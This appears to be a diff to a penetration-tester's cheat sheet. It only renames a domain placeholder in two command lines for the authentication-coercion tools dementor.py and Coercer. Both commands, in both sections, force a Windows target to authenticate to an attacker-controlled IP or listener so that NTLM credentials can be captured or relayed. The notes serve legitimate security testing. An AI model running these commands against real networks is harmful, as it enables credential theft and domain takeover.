@@ -6,14 +6,14 @@
 ## coerce
 https://github.com/NotMedic/NetNTLMtoSilverTicket
 ```
-dementor.py -d <domain> -u <user> -p <password> <attacker_ip> <dc2>
+dementor.py -d <domain_fqdn> -u <user> -p <password> <attacker_ip> <dc2>
 ```
 
 
 ## Coercer
 https://github.com/p0dalirius/Coercer
 ```
-coercer.py -u <user> -p '<password>' -d <domain> -l <listener> -t <target-ip>
+coercer.py -u <user> -p '<password>' -d <domain_fqdn> -l <listener> -t <target-ip>
 ```
 
 
